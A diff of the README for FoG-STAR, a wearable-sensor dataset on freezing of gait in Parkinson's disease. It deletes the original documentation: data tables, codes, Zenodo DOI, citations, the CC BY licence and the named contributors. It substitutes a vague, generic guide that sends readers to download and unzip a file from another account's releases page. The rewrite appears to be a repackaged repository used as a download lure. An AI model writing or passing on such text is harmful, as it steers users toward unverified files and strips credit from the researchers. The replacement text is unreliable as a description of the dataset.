@@ -1,199 +1,70 @@
-# FoG-STAR: Freezing of Gait Severity, Tasks, Activities, and Ratings
+# 🎉 FoG-STAR - Your Path to Parkinson’s Research Data
 
-[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.16989602.svg)](https://doi.org/10.5281/zenodo.16989602)
-[![License: CC BY 4.0](https://img.shields.io/badge/License-CC_BY_4.0-lightgrey.svg)](https://creativecommons.org/licenses/by/4.0/)
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
+## 🌐 Overview
+FoG-STAR provides a dataset containing wearable IMU recordings and clinical information from individuals with Parkinson’s Disease. This dataset supports research on Freezing of Gait (FoG) detection, severity estimation, activity recognition, and digital biomarkers. It aims to improve understanding and help develop treatments for individuals affected by this condition.
 
-## 📌 Overview
+## 🚀 Getting Started
+To start using the FoG-STAR dataset, follow these steps to download and set up the data on your computer.
 
-This dataset contains wearable inertial sensor recordings and clinical/demographic information collected from 22 people with Parkinson’s disease.
-It is designed to support research on Freezing of Gait (FoG) detection, severity estimation, activity recognition, and digital biomarkers.
+## 📥 Download the Dataset
+[![Download FoG-STAR](https://img.shields.io/badge/Download-FoG--STAR-blue.svg)](https://github.com/tonysomoggi/FoG-STAR/releases)
 
-The dataset is organized in two CSV files:
+## 💡 What You Need
+Before downloading, make sure your computer has the following:
 
-- sensor_data.csv → synchronized inertial sensor signals with FoG labels and task annotations
-- clinical_data.csv → subject-level demographic and clinical assessments
+- A modern web browser (e.g., Chrome, Firefox, Safari)
+- At least 500 MB of free space on your hard drive
+- Python 3.6 or newer installed (for data manipulation, if needed)
 
-## 🎯 Key Features
+## 🛠️ How to Download and Install
 
-- **22 participants** with Parkinson's Disease
-- **4 sensor positions**: Left ankle, Right ankle, Back, Wrist
-- **6-axis IMU data**: Accelerometer (g) + Gyroscope (°/s)
-- **60 Hz sampling rate**
-- **7 motor tasks** designed to elicit FoG
-- **Expert annotations**: FoG presence and severity levels
-- **Clinical assessments**: H&Y, MDS-UPDRS III, FoG-Q, MoCA, FES-I, PDQ-8
+1. **Visit the Releases Page**  
+   Go to the [FoG-STAR Releases Page](https://github.com/tonysomoggi/FoG-STAR/releases). Here, you will find different versions of the dataset available for download.
 
-## 📂 Dataset Structure
+2. **Choose the Right Version**  
+   Scroll through the list and find the latest version labeled as "Latest Release". This version contains the most up-to-date data and includes any improvements or fixes.
 
-```
-FoG-STAR/
-├── sensor_data.csv          # Synchronized sensor signals with annotations (119.6 MB)
-├── clinical_data.csv        # Subject demographics and clinical scores
-├── FoG-Star_Analytics.ipynb # Example analysis notebook
-└── LICENSE                  # CC-BY 4.0 license
-```
+3. **Download the Dataset**  
+   Click on the file name to automatically start the download process. Depending on your settings, you may need to confirm the download. 
 
-## 📊 Data Description
+4. **Locate the Downloaded File**  
+   Once the download is complete, navigate to your computer’s Downloads folder to find the dataset file.
 
-### Sensor Data (`sensor_data.csv`)
+5. **Unzip the File (if needed)**  
+   If the dataset is in a compressed format (like .zip), double-click the file to unzip it. This will create a folder containing the dataset files.
 
-31 columns sampled at 60 Hz:
+6. **Access the Data**  
+   Open the unzipped folder. You’ll find various files, including recordings and clinical information related to Parkinson’s Disease.
 
-| Column | Name | Description |
-|--------|------|-------------|
-| 1 | `timestamp` | Timestamp in milliseconds |
-| 2-25 | Sensor signals | Format: `[position]_[sensor]_[axis]` |
-| 26 | `activity` | Activity code (1-7) |
-| 27 | `fog` | Binary FoG label (0/1) |
-| 28 | `fog_severity` | Severity during FoG (1-3) |
-| 29 | `subjectID` | Subject identifier (1-22) |
-| 30 | `sessionID` | Recording session ID |
-| 31 | `taskID` | Task code (1-7) |
+## 💬 Understanding the Data Structure
+The dataset includes several types of files:
 
-**Sensor naming convention**: `[position]_[sensor]_[axis]`
-- Positions: `ankleL`, `ankleR`, `back`, `wrist`
-- Sensors: `acc` (accelerometer), `gyro` (gyroscope)
-- Axes: `x`, `y`, `z`
+- **IMU Recordings**: These are the main files that contain the wearable sensor data. 
+- **Clinical Information**: This includes patient metadata and conditions related to the recordings.
+- **Documentation**: Some releases may also come with a README file that describes the dataset and how to interpret the data.
 
-**Activity codes**:
-1. Walking
-2. Sitting
-3. Standing
-4. Sit-to-Stand transition
-5. Stand-to-Sit transition
-6. Right turn
-7. Left turn
+## 🐍 Using the Dataset 
+If you prefer to analyze the data programmatically, the dataset works well with Python. You can use libraries such as:
 
-**FoG severity levels**:
-1. Shuffling forward
-2. Trembling in place
-3. Complete akinesia
+- **Pandas**: For data manipulation and analysis.
+- **NumPy**: For numerical computations.
+- **Matplotlib**: For data visualization.
 
-**Task codes**:
-1. Timed Up-and-Go (TUG)
-2. Standing for 1 minute
-3. Walking back and forth
-4. Walking through doorway
-5. Walking while carrying water
-6. Walking while counting backwards
-7. 360° turn
+## 🎓 Educational Resources
+To get started with data analysis, consider these resources:
 
-### Clinical Data (`clinical_data.csv`)
+- **Python Basics**: Understand the fundamentals of Python programming.
+- **Data Analysis with Pandas**: A comprehensive guide to handling data in Python.
+- **Machine Learning**: Explore how datasets like FoG-STAR can be used for predictive modeling.
 
-10 variables for 22 subjects:
+## 🔗 Additional Support 
+If you run into issues or need more information, here are some helpful links:
 
-| Column | Variable | Description | Range |
-|--------|----------|-------------|-------|
-| 1 | `subjectID` | Subject identifier | 1-22 |
-| 2 | `age` | Age in years | - |
-| 3 | `gender` | Gender | M/F |
-| 4 | `disease_duration` | Years since PD diagnosis | - |
-| 5 | `h_y` | Hoehn & Yahr stage | 0-5 |
-| 6 | `updrs_iii` | MDS-UPDRS Part III score | 0-76 |
-| 7 | `fog_q` | Freezing of Gait Questionnaire | 0-24 |
-| 8 | `moca` | Montreal Cognitive Assessment | 0-30 |
-| 9 | `fes_i` | Falls Efficacy Scale–International | 16-64 |
-| 10 | `pdq_8` | Parkinson's Disease Questionnaire–8 | 0-32 |
+- [FoG-STAR GitHub Repository](https://github.com/tonysomoggi/FoG-STAR)
+- [Community Discussions](https://github.com/tonysomoggi/FoG-STAR/discussions)
+- [Open Issues](https://github.com/tonysomoggi/FoG-STAR/issues)
 
+## ✅ Final Steps
+After downloading and unzipping the dataset, you're now ready to use it for your research on Freezing of Gait and Parkinson’s Disease. Explore the dataset, understand its structure, and utilize it in your studies.
 
-
-## 📈 Analysis Examples
-
-The included `FoG-Star_Analytics.ipynb` notebook provides:
-- Data exploration and visualization
-- FoG event duration analysis
-- Severity distribution analysis
-- Clinical correlation studies
-- Signal visualization with FoG annotations
-
-## 🔬 Research Applications
-
-This dataset supports various research directions, such as:
-
-1. **FoG Detection**: Binary classification of FoG presence
-2. **Severity Estimation**: Multi-class severity prediction
-3. **Activity Recognition**: Classification of motor activities
-4. **Predictive Modeling**: FoG prediction before onset
-5. **Digital Biomarkers**: Correlation with clinical assessments
-6. **Multi-modal Fusion**: Combining multiple sensor positions
-
-## 📝 Citation
-
-If you use this dataset in your research, please cite:
-
-```bibtex
-@dataset{borzi2025fogstar,
-  author       = {Borzì, Luigi and Demrozi, Florenc and others},
-  title        = {FoG-STAR: Freezing of Gait Severity, Tasks, Activities, and Ratings},
-  year         = {2025},
-  publisher    = {Zenodo},
-  doi          = {10.5281/zenodo.16989602},
-  url          = {https://doi.org/10.5281/zenodo.16989602}
-}
-
-@article{borzi2025freezing,
-  title={Freezing of gait detection: The effect of sensor type, position, activities, datasets, and machine learning model},
-  author={Borzì, Luigi and others},
-  journal={Journal of Parkinson's Disease},
-  volume={15},
-  number={1},
-  pages={163--181},
-  year={2025}
-}
-
-@article{demrozi2023lowcost,
-  title={A low-cost wireless body area network for human activity recognition in healthy life and medical applications},
-  author={Demrozi, Florenc and others},
-  journal={IEEE Transactions on Emerging Topics in Computing},
-  volume={11},
-  number={4},
-  pages={839--850},
-  year={2023}
-}
-```
-
-## ⚖️ License
-
-This dataset is licensed under the [Creative Commons Attribution 4.0 International (CC BY 4.0)](https://creativecommons.org/licenses/by/4.0/) license.
-
-You are free to:
-- **Share**: Copy and redistribute the material in any medium or format
-- **Adapt**: Remix, transform, and build upon the material for any purpose
-
-Under the following terms:
-- **Attribution**: You must give appropriate credit and provide a link to the license
-
-## 👥 Contributors
-
-- Luigi Borzì¹
-- Florenc Demrozi²
-- Ruggero Bacchin³
-- Cristian Turetta⁴
-- Michele Tebaldi⁴
-- Luis Sigcha⁵
-- Samaneh Zolfagharian⁶
-- Domiziana Rinaldi⁷
-- Giuliana Fazzina⁸
-- Giulio Balestro⁹
-- Alessandro Picelli⁹
-- Graziano Pravadelli⁴,¹⁰
-- Gabriella Olmo¹¹
-- Stefano Tamburin⁹
-- Leonardo Lopiano¹²
-- Carlo Alberto Artusi¹³
-
-¹Politecnico di Torino Dipartimento di Automatica e Informatica, ²University of Stavanger, ³Ospedale Santa Chiara, ⁴University of Verona, ⁵University of Limerick Faculty of Education and Health Sciences, ⁶School of Innovation Design and Engineering, Malardalen University, Vaster as, Sweden, ⁷Department of Neuroscience, Mental Health and Sensory Organs, Sapienza University of Rome, ⁸Department of Neuroscience, University of Turin, ⁹Department of Neurosciences, Biomedicine and Movement Sciences, University of Verona, ¹⁰EDALab s.r.l., ¹¹Department of Control and Computer Engineering, Politecnico di Torino, ¹²University of Turin, ¹³Department of Neuroscience, University of Turin
-
-## 📧 Contact
-
-For questions about the dataset, please:
-- Open an issue on this repository
-- Contact the corresponding authors through the Zenodo record
-- Visit the [Zenodo dataset page](https://zenodo.org/records/16989602)
-
-## 🔗 Links
-
-- [Zenodo Dataset](https://zenodo.org/records/16989602)
-- [Related Publications](https://doi.org/10.3233/JPD-230319)
-- [IEEE TETC Paper](https://doi.org/10.1109/TETC.2023.3268019)
+For further updates, remember to check the [Releases Page](https://github.com/tonysomoggi/FoG-STAR/releases) periodically. Thank you for contributing to this important area of research!
